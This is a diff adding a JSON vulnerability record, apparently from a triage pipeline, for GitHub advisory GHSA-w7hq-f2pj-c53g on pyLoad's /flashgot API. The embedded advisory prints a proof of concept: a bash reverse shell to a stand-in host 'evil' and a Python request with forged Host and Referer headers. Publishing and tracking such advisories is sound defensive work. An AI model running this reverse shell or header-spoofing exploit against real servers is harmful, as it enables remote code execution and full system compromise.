@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/9999954?v=4\", \"events_url\": \"https://api.github.com/users/anuraagbaishya/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/anuraagbaishya/followers\", \"following_url\": \"https://api.github.com/users/anuraagbaishya/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/anuraagbaishya/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/anuraagbaishya\", \"id\": 9999954, \"login\": \"anuraagbaishya\", \"node_id\": \"MDQ6VXNlcjk5OTk5NTQ=\", \"organizations_url\": \"https://api.github.com/users/anuraagbaishya/orgs\", \"received_events_url\": \"https://api.github.com/users/anuraagbaishya/received_events\", \"repos_url\": \"https://api.github.com/users/anuraagbaishya/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/anuraagbaishya/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/anuraagbaishya/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/anuraagbaishya\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2024-47821\", \"cvss\": {\"score\": 9.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 8.5, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P\"}}, \"cwes\": [{\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}], \"description\": \"### Summary\\nThe folder `/.pyload/scripts` has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in /scripts and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in `/scripts` path and using the `/flashgot` API to download the file.\\n\\n### Details\\n\\n**Configuration changes**\\n1. Change the download folder to `/home/<user>/.pyload/scripts`\\n2. Change permissions for downloaded files:\\n    1. Change permissions of downloads: on\\n    2. Permission mode for downloaded files: 0744\\n\\n**Making the request to download files**\\n\\nThe `flashgot` API provides functionality to download files from a provided URL. Although pyload tries to prevent non-local requests from being able to reach this API, it relies on checking the Host header and the Referer header of the incoming request. Both of these can be set by an attacker to arbitrary values, thereby bypassing these checks.\\n\\n*Referer header check*\\n```\\ndef flashgot():\\n    if flask.request.referrer not in (\\n        \\\"http://localhost:9666/flashgot\\\",\\n        \\\"http://127.0.0.1:9666/flashgot\\\",\\n    ):\\n        flask.abort(500)\\n  ...\\n```\\n*Host header check for local check*\\n```\\ndef local_check(func):\\n    @wraps(func)\\n    def wrapper(*args, **kwargs):\\n        remote_addr = flask.request.environ.get(\\\"REMOTE_ADDR\\\", \\\"0\\\")\\n        http_host = flask.request.environ.get(\\\"HTTP_HOST\\\", \\\"0\\\")\\n\\n        if remote_addr in (\\\"127.0.0.1\\\", \\\"::ffff:127.0.0.1\\\", \\\"::1\\\", \\\"localhost\\\") or http_host in (\\n            \\\"127.0.0.1:9666\\\",\\n            \\\"[::1]:9666\\\",\\n        ):\\n            return func(*args, **kwargs)\\n        else:\\n            return \\\"Forbidden\\\", 403\\n\\n    return wrapper\\n```\\n\\nOnce the file is downloaded to a folder in the scripts folder, the attacker can perform the respective action, and the script will be executed\\n\\n\\n### PoC\\nCreate a malicious file. I have created a reverse shell\\n```\\n#!/bin/bash\\nbash -i >& /dev/tcp/evil/9002 0>&1\\n```\\n\\nHost this file at some URL, for eg: http://evil\\n\\nCreate a request like this for the `flashgot` API. I am using `download_finished` folder as the destination folder. Scripts in this folder are run when a download is completed.\\n```\\nimport requests\\n\\nurl = \\\"http://pyload/flashgot\\\"\\nheaders = {\\\"host\\\": \\\"127.0.0.1:9666\\\", \\\"Referer\\\": \\\"http://127.0.0.1:9666/flashgot\\\"}\\n\\ndata = {\\n    \\\"package\\\": \\\"download_finished\\\",  \\n    \\\"passwords\\\": \\\"optional_password\\\",  \\n    \\\"urls\\\": \\\"http://evil/exp.sh\\\",\\n    \\\"autostart\\\": 1,\\n}\\n\\n\\nresponse = requests.post(url, data=data, headers=headers)\\n```\\nWhen the above request is made, exp.sh will be downloaded to `/scripts/download_finished folder`. For all subsequent downloads, this script will be run. Sending the request again causes a download of the file again, and when the download is complete, the script is run.\\n\\nI also have a listener on my machine which receives the request from the pyload server. When the script executes, I get a connection back to my machine\\n\\n### Screenshots\\n*Download folder*\\n\\n<img width=\\\"672\\\" alt=\\\"1\\\" src=\\\"https://github.com/user-attachments/assets/77fc5202-bed2-41a2-98ae-9cb7b1315f76\\\">\\n\\n*`exp.sh` is downloaded*\\n\\n<img width=\\\"714\\\" alt=\\\"2\\\" src=\\\"https://github.com/user-attachments/assets/5e6e19db-2a5c-48f4-9973-817528b5b9ec\\\">\\n\\n*Script is run*\\n\\n<img width=\\\"714\\\" alt=\\\"3\\\" src=\\\"https://github.com/user-attachments/assets/34fbdaee-50ba-46a8-a372-ec8c91d03aa9\\\">\\n\\n*Reverse shell connection is received*\\n\\n<img width=\\\"314\\\" alt=\\\"4\\\" src=\\\"https://github.com/user-attachments/assets/4713d56e-e850-47ad-99b3-cab0c7bba800\\\">\\n\\n\\n### Impact\\nThis vulnerability allows an attacker with access to change the settings on a pyload server to execute arbitrary code and completely compromise the system\", \"epss\": {\"percentage\": 0.00679, \"percentile\": 0.47536}, \"ghsa_id\": \"GHSA-w7hq-f2pj-c53g\", \"github_reviewed_at\": \"2024-10-28T12:23:29Z\", \"html_url\": \"https://github.com/advisories/GHSA-w7hq-f2pj-c53g\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w7hq-f2pj-c53g\"}, {\"type\": \"CVE\", \"value\": \"CVE-2024-47821\"}], \"nvd_published_at\": \"2024-10-25T23:15:02Z\", \"published_at\": \"2024-10-28T12:23:29Z\", \"references\": [\"https://github.com/pyload/pyload/security/advisories/GHSA-w7hq-f2pj-c53g\", \"https://nvd.nist.gov/vuln/detail/CVE-2024-47821\", \"https://github.com/pyload/pyload/commit/48f59567393a19263c8a0285256a7537dc9ce109\", \"https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2024-302.yaml\", \"https://github.com/advisories/GHSA-w7hq-f2pj-c53g\"], \"repository_advisory_url\": \"https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-w7hq-f2pj-c53g\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/pyload/pyload\", \"summary\": \"pyLoad vulnerable to remote code execution by download to /.pyload/scripts using /flashgot API\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T19:07:15Z\", \"url\": \"https://api.github.com/advisories/GHSA-w7hq-f2pj-c53g\", \"vulnerabilities\": [{\"first_patched_version\": \"0.5.0b3.dev87\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyload-ng\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.5.0b3.dev87\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w7hq-f2pj-c53g",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyload-ng: < 0.5.0b3.dev87"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2024-47821"
+    ],
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyload-ng"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.417598Z",
+  "provenance": {
+    "content_sha256": "502cdd0e260480c5f766e04d45503b84101c6dadb363ca8d332478d03a3edcf8",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2024-10-28T12:23:29Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w7hq-f2pj-c53g",
+  "status": "active",
+  "title": "pyLoad vulnerable to remote code execution by download to /.pyload/scripts using /flashgot API",
+  "updated_at": "2026-06-08T19:07:15Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w7hq-f2pj-c53g"
+}
